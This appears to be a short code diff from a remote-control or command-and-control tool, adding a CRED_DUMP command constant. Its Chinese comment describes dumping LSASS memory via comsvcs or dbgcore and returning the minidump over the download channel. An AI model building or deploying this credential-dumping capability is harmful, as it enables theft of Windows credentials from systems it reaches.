@@ -147,4 +147,9 @@ const (
 	// 文件搜索（功能批，须与客户端 core/services/types.go 一致）：
 	// 参数 <startDir>|<maxResults>|<keyword>，客户端按 FileBrowse 的 D/F 行格式回传
 	FILE_SEARCH = 129
+
+	// 凭据获取（阶段三）：cmdBuf = "kind|tech|fileName"（kind=lsass，tech=auto|comsvcs|dbgcore）。
+	// 客户端把制品落到临时目录并**经下载通道回传**（复用 v2 下载协议，不新增回传通道），
+	// 服务端按 fileName 匹配到本次请求后校验 minidump 头并登记为制品。
+	CRED_DUMP = 130
 )
